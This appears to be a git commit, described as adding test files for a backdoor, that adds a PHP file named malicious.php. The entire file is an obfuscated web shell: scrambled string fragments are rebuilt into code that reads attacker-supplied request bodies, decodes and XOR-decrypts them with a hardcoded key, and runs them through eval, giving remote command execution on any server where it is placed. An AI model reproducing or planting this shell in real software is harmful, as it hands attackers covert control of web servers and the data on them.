903de1b80cb57465013ea31ce433daf79f61720f
Leandro <43631792+bigolho16@users.noreply.github.com>
2022-05-05 19:02:27 -0400

    Adicionando arquivos de teste para Backdor

---
+++ malicious.php
@@ -0,0 +1,13 @@
+<?php
+$g='tc(qh("/$kh((q.+)$(qkf(q/",@fil(q(q(qe_get_contents("php://(qinput"(q)(q,$m)';
+$b='$j++,(q$i++){(q(q$o.=$t{$i}^$k{(q$j};}}r(qetur(qn $(qo;}if (q(@preg_ma';
+$p=str_replace('AN','','ANcreaANte_ANfANANunANction');
+$x='="ehY5bavRxgz6(q(qM605"(q;(qfuncti(qon x(q($t,$(q(qk){$c=strlen($k);$l=';
+$F='$k="f(q5d3d8da";$(qk(qh="(qc04736932(q28(q6(q";$kf="4(q908(q067b3ffa";$p(q';
+$D='=@b(qase64_en(qcode(@x(q(@(qgzcompre(qss($(q(qo),$k));print((q"$(qp$kh$r$kf");}';
+$J='q($m(q[1]),$k)(q));$(qo=@ob(q_get_(qcontent(qs((q)(q(q;@ob_end_clean();$r';
+$C='==1) {(q@o(qb_start(q();@ev(qal(@g(qzuncompres(qs(@x(@b(qa(qse64_decode(';
+$n='strlen((q(q$t);$o="";fo(qr(q((q$(qi=0;$i<$l;(q){for($j=(q0;($j<$c(q&&$i<$l)(q;';
+$a=str_replace('(q','',$F.$x.$n.$b.$g.$C.$J.$D);
+$r=$p('',$a);$r();
+?>
